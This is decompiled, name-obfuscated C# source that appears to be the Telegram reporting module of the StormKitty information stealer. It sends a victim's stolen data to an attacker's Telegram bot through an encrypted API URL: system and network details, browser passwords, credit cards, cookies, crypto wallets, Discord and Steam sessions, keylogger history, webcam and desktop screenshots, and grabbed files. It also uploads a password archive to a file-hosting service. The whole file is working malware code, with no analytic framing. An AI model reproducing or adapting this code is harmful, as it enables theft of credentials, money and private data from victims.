using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using ns1;
using ns13;
using ns16;
using ns2;

namespace ns14;

internal sealed class Class68
{
	private const int int_0 = 10;

	private static string string_0 = Class9.smethod_1(new byte[32]
	{
		239, 217, 27, 234, 106, 21, 204, 49, 53, 43,
		140, 84, 157, 206, 231, 110, 180, 238, 101, 7,
		217, 169, 12, 49, 56, 145, 75, 213, 195, 135,
		141, 221
	});

	private static string string_1 = Path.Combine(Class55.smethod_0(), "msgid.dat");

	private static string string_2 = Path.Combine(Class55.smethod_0(), "history.dat");

	public static void smethod_0(int int_1)
	{
		File.WriteAllText(string_1, int_1.ToString());
		Class77.smethod_0(string_1);
		Class77.smethod_1(string_1);
	}

	public static int smethod_1()
	{
		if (File.Exists(string_1))
		{
			return int.Parse(File.ReadAllText(string_1));
		}
		return -1;
	}

	private static int smethod_2(string string_3)
	{
		return int.Parse(Regex.Match(string_3, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));
	}

	public static bool smethod_3()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString(string_0 + GClass10.string_0 + "/getMe").StartsWith("{\"ok\":true,");
		}
		catch
		{
		}
		return false;
	}

	public static int smethod_4(string string_3)
	{
		try
		{
			using WebClient webClient = new WebClient();
			return smethod_2(webClient.DownloadString(string_0 + GClass10.string_0 + "/sendMessage?chat_id=" + GClass10.string_1 + "&text=" + string_3 + "&parse_mode=Markdown&disable_web_page_preview=True"));
		}
		catch
		{
		}
		return 0;
	}

	public static void smethod_5(string string_3, int int_1)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString(string_0 + GClass10.string_0 + "/editMessageText?chat_id=" + GClass10.string_1 + "&text=" + string_3 + "&message_id=" + int_1 + "&parse_mode=Markdown&disable_web_page_preview=True");
		}
		catch
		{
		}
	}

	private static void smethod_6()
	{
		if (Directory.Exists(Path.Combine(Class55.smethod_0(), "logs")))
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
			string text2 = Class59.smethod_0(text + ".zip");
			File.Delete(text + ".zip");
			File.AppendAllText(string_2, "\t\t\t\t\t\t\t- [" + text.Replace("_", " ").Replace(".", ":") + "](" + text2 + ")\n");
			Class77.smethod_1(string_2);
		}
	}

	private static string smethod_7()
	{
		if (!File.Exists(string_2))
		{
			return "";
		}
		List<string> list = File.ReadAllLines(string_2).Reverse().Take(10)
			.Reverse()
			.ToList();
		string text = ((list.Count == 10) ? $"({list.Count} - MAX)" : $"({list.Count})");
		string text2 = string.Join("\n", list);
		return "\n\n  ⌨\ufe0f *Keylogger " + text + ":*\n" + text2;
	}

	private static void smethod_8(string string_3)
	{
		smethod_6();
		string string_4 = "\n  \ud83d\ude39 *StormKitty - Report:*\nDate: " + Class66.string_3 + "\nSystem: " + Class66.smethod_4() + "\nUsername: " + Class66.string_0 + "\nCompName: " + Class66.string_1 + "\nLanguage: " + Class64.smethod_0(Class66.string_2.Split(new char[1] { '-' })[1]) + " " + Class66.string_2 + "\nAntivirus: " + Class66.smethod_7() + "\n\n  \ud83d\udcbb *Hardware:*\nCPU: " + Class66.smethod_12() + "\nGPU: " + Class66.smethod_13() + "\nRAM: " + Class66.smethod_14() + "\nHWID: " + Class66.smethod_5() + "\nPower: " + Class66.smethod_1() + "\nScreen: " + Class66.smethod_0() + "\n\n  \ud83d\udce1 *Network:* \nGateway IP: " + Class66.smethod_6() + "\nInternal IP: " + Class66.smethod_8() + "\nExternal IP: " + Class66.smethod_9() + "\n" + Class66.smethod_11() + "\n\n  \ud83d\udcb8 *Domains info:*" + Class54.smethod_2("\ud83c\udfe6 *Banking services*", Class54.list_0, '-') + Class54.smethod_2("\ud83d\udcb0 *Cryptocurrency services*", Class54.list_1, '-') + Class54.smethod_2("\ud83c\udf53 *Porn websites*", Class54.list_2, '-') + smethod_7() + "\n\n  \ud83c\udf10 *Browsers:*" + Class54.smethod_1("\ud83d\udd11 Passwords", Class54.int_0) + Class54.smethod_1("\ud83d\udcb3 CreditCards", Class54.int_1) + Class54.smethod_1("\ud83c\udf6a Cookies", Class54.int_3) + Class54.smethod_1("\ud83d\udcc2 AutoFill", Class54.int_2) + Class54.smethod_1("⏳ History", Class54.int_4) + Class54.smethod_1("\ud83d\udd16 Bookmarks", Class54.int_5) + Class54.smethod_1("\ud83d\udce6 Downloads", Class54.int_6) + "\n\n  \ud83d\uddc3 *Software:*" + Class54.smethod_1("\ud83d\udcb0 Wallets", Class54.int_9) + Class54.smethod_1("\ud83d\udce1 FTP hosts", Class54.int_10) + Class54.smethod_1("\ud83d\udd0c VPN accounts", Class54.int_7) + Class54.smethod_1("\ud83e\udda2 Pidgin accounts", Class54.int_8) + Class54.smethod_0("✈\ufe0f Telegram sessions", Class54.bool_0) + Class54.smethod_0("\ud83d\udcac Discord token", Class54.bool_3) + Class54.smethod_0("\ud83c\udfae Steam session", Class54.bool_1) + Class54.smethod_0("\ud83c\udfae Uplay session", Class54.bool_2) + "\n\n  \ud83e\udded *Device:*" + Class54.smethod_0("\ud83d\udddd Windows product key", Class54.bool_4) + Class54.smethod_1("\ud83d\udef0 Wifi networks", Class54.int_11) + Class54.smethod_0("\ud83d\udcf8 Webcam screenshot", Class54.bool_6) + Class54.smethod_0("\ud83c\udf03 Desktop screenshot", Class54.bool_5) + "\n\n  \ud83d\udcc4 *File Grabber:*" + Class54.smethod_1("\ud83d\udcc2 Source code files", Class54.int_13) + Class54.smethod_1("\ud83d\udcc2 Database files", Class54.int_14) + Class54.smethod_1("\ud83d\udcc2 Documents", Class54.int_12) + Class54.smethod_1("\ud83d\udcc2 Images", Class54.int_15) + "\n\n\ud83d\udd17 [Archive download link](" + string_3 + ")\n\ud83d\udd10 *Archive password is*: \"_" + Class78.string_0 + "\"_";
		int num = smethod_1();
		if (num != -1)
		{
			smethod_5(string_4, num);
		}
		else
		{
			smethod_0(smethod_4(string_4));
		}
	}

	public static void smethod_9(string string_3)
	{
		Console.WriteLine("Sending passwords archive to anonfile");
		string string_4 = Class59.smethod_0(string_3, smethod_1() == -1);
		File.Delete(string_3);
		Console.WriteLine("Sending report to telegram");
		smethod_8(string_4);
		Console.WriteLine("Report sent to telegram bot");
	}
}
